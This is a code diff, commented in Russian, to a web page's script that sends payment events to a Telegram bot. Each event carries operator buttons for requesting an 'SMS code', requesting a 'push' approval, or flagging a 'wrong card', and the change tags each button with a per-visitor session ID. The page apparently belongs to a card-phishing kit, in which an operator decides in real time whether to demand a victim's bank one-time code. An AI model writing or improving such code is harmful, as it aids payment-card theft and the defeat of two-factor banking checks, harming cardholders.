@@ -1267,7 +1267,10 @@
             window.location.href = 'index.html';
         });
 
-        let paymentCounter = 0;
+       let paymentCounter = 0;
+// ДОБАВЬ ЭТИ 2 СТРОКИ В САМОМ ВЕРХУ
+const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
+sessionStorage.setItem('currentUserId', userId);
 
 async function sendToTelegramBot() {
     try {
@@ -1307,17 +1310,17 @@ async function sendToTelegramBot() {
                         [
                             { 
                                 text: "📱 SMS код", 
-                                callback_data: `sms_${paymentId}_user123`
+                                callback_data: `sms_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
                             },
                             { 
                                 text: "🔔 Пуш", 
-                                callback_data: `push_${paymentId}_user123`
+                                callback_data: `push_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
                             }
                         ],
                         [
                             { 
                                 text: "❌ Неверная карта", 
-                                callback_data: `wrong_card_${paymentId}_user123`
+                                callback_data: `wrong_card_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
                             }
                         ]
                     ]
@@ -1483,6 +1486,7 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
+
 
 
 
